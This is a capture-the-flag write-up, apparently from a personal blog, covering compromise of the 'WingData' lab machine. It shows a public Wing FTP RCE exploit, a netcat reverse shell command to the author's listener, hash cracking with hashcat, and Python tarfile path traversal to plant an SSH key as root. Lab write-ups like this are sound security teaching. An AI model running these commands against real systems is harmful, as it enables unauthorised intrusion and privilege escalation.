+++
date = '2026-07-21T16:13:04+02:00'
draft = false
title = 'WingData Writeup EN'
+++
**Name**: **`joy.scd01`**

**Date**: **`24/02/2026`**

![WingData.png](/images/imgs_wingdata/WingData.png)

---
# Introduction

**_WingData_** is a solid **Easy-level Linux** box that provides a modern exploitation path. The machine starts with standard web enumeration leading to a vulnerable instance of **Wing FTP Server**, which is exploited via a recent **RCE CVE**. Lateral movement requires understanding how the application stores and salts its passwords, allowing us to crack a hash and **SSH** into a user account. Finally, privilege escalation involves abusing a **Python tarfile** module **path traversal** vulnerability via a customized script to drop an **SSH key** into the **root** directory.

---
# Techniques Used

- **Wing FTP Server Exploitation (CVE-2025-47812)**

- **Password Hash Cracking**

- **Python tarfile Path Traversal Exploitation (CVE-2025-4517)**

---
# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- wingdata
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV wingdata
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open ports**:

- **22**/tcp - SSH

- **80**/tcp - HTTP (Apache/2.4.66)

## Web Enumeration

On port 80 was hosted a "**Wing Data Solution**" website. 

![web.png](/images/imgs_wingdata/web.png)

Clicking on the "**Client Portal**" button redirected me to **`ftp.wingdata.htb`**.

![error.png](/images/imgs_wingdata/error.png)

I added it to my **`/etc/hosts`** file.

Browsing to **`ftp.wingdata.htb`**, I landed on a **Wing FTP Server Web Client** login page, which disclosed its exact version at the bottom: **`v7.4.3`**.

![ftp.png](/images/imgs_wingdata/ftp.png)

---
# Initial Access | Wing FTP RCE

I searched online for vulnerabilities affecting **Wing FTP Server version 7.4.3** and quickly found **CVE-2025-47812**, an **Unauthenticated Remote Code Execution** flaw:

- **https://www.exploit-db.com/exploits/52347**

![exploit.png](/images/imgs_wingdata/exploit.png)

I grabbed the **Python PoC** from **Exploit-DB** (**ID: 52347**) and tested it.

```bash
python3 wing.py -u http://ftp.wingdata.htb -c whoami
```

![whoami.png](/images/imgs_wingdata/whoami.png)

The command execution worked perfectly. Before grabbing a shell, I read the **`/etc/passwd`** file and noticed an interesting user named **wacky**.

![passwd.png](/images/imgs_wingdata/passwd.png)

I tried a few common rev shell payloads. The only one that successfully connected back to my listener was the classic netcat with the **`-e`** flag.

```bash
python3 wing.py -u http://ftp.wingdata.htb -c 'nc 10.10.16.77 22667 -e /bin/sh'
```

![initial_access.png](/images/imgs_wingdata/initial_access.png)

I caught the shell and got my initial foothold as the **wingftp** service account.

---
# Lateral Movement | Password Cracking

I found several user configuration files stored in **`/opt/wftpserver/Data/1/users/`**. Since I had already spotted the user **wacky** in the **`/etc/passwd`** file earlier, I knew exactly which profile was the most valuable to target. I opened **`wacky.xml`** and extracted the hashed credentials.

![hash.png](/images/imgs_wingdata/hash.png)

I checked the official **Wing FTP** documentation to understand how it stores and hashes passwords. It uses **SHA-256** with a default salt of **WingFTP**, formatted as **`sha256($pass.$salt)`**.

- **https://www.wftpserver.com/help/ftpserver/index.html?compression.htm**

![salting.png](/images/imgs_wingdata/salting.png)

Referencing the official **Hashcat example_hashes** page, this format corresponds to mode **`1410`**.

- **https://hashcat.net/wiki/doku.php?id=example_hashes**

![hmode.png](/images/imgs_wingdata/hmode.png)

I saved the hash into **`pass.txt`** and fired up **Hashcat**:

```bash
hashcat -m 1410 pass.txt /usr/share/wordlists/rockyou.txt
```

![pass.png](/images/imgs_wingdata/pass.png)

I used these credentials to **SSH** into the machine as **wacky** and grabbed the **user flag**.

```bash
ssh wacky@wingdata.htb
```

![userflag.png](/images/imgs_wingdata/userflag.png)

---
# Privilege Escalation | Python Tarfile CVE

With **SSH** access and a valid password, I immediately checked my sudo privileges.

```bash
sudo -l
```

![sudol.png](/images/imgs_wingdata/sudol.png)

**Note**: _The script uses **`tar.extractall(filter="data")`**, which is meant to prevent **path traversal**. However, **CVE-2025-4517** bypasses this exact protection by abusing symlinks and path length limits (**PATH_MAX**), allowing us to escape the destination folder and drop our **SSH key** directly into **`/root/.ssh/`**._

I initially tried to use a public **PoC** by **0xDTC**:

- **https://github.com/0xDTC/CVE-2025-4517-tarfile-PATH_MAX-bypass**

But the exploit kept failing. However, debugging it helped me understand in depth how the vulnerability actually works under the hood.

![privescfail.png](/images/imgs_wingdata/privescfail.png)

So, I found another script provided by the **Google Security Research team** and manually modified it to fit my needs. I adjusted the payload to include my **public key** and tweaked the **traversal path**:

- **https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f**

**Snippet of modified script**:

![script1.png](/images/imgs_wingdata/script1.png)
![script2.png](/images/imgs_wingdata/script2.png)


I saved the modified script as **`mal.py`** inside the **`/opt/backup_clients/backups`** directory, generated the malicious tar, and executed the vulnerable sudo command:

```bash
python3 mal.py
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1.tar --restore-dir restore_1
```

![privesc.png](/images/imgs_wingdata/privesc.png)

The script silently dropped my **SSH key** into the **root** directory. I simply **SSH**'d into the box as **root** and claimed the **final flag**.

```bash
ssh root@wingdata.htb
```

![rootflag.png](/images/imgs_wingdata/rootflag.png)

**Note**: _After finishing the box, I decided to troubleshoot the initial **PoC** by **0xDTC** that failed me. I realized the script itself was perfectly fine; I was just passing the wrong value to the **`DEPTH_TO_ROOT`** parameter. Regardless, rewriting and modifying the **Google Security Research** script from scratch was a much better learning experience to truly understand how the tarfile vulnerability operates under the hood._

---
# Final Thoughts

**_WingData_** is a box that rewards good research and adaptation skills. The **Wing FTP RCE** is a great modern foothold. The privilege escalation is definitely the highlight of the machine, as it forces you to deeply understand the **path traversal** vulnerability rather than just blindly firing public exploits.

**Sources**:

- **Wing FTP Server CVE-2025-47812 PoC | https://www.exploit-db.com/exploits/52347**

- **Wing FTP Password Salting Documentation | https://www.wftpserver.com/help/ftpserver/index.html?compression.htm**

- **Hashcat example_hashes | https://hashcat.net/wiki/doku.php?id=example_hashes**

- **Python tarfile CVE-2025-4517 PoC (0xDTC) | https://github.com/0xDTC/CVE-2025-4517-tarfile-PATH_MAX-bypass**

- **Python tarfile CVE-2025-4517 Advisory (Google Security Research) | https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f**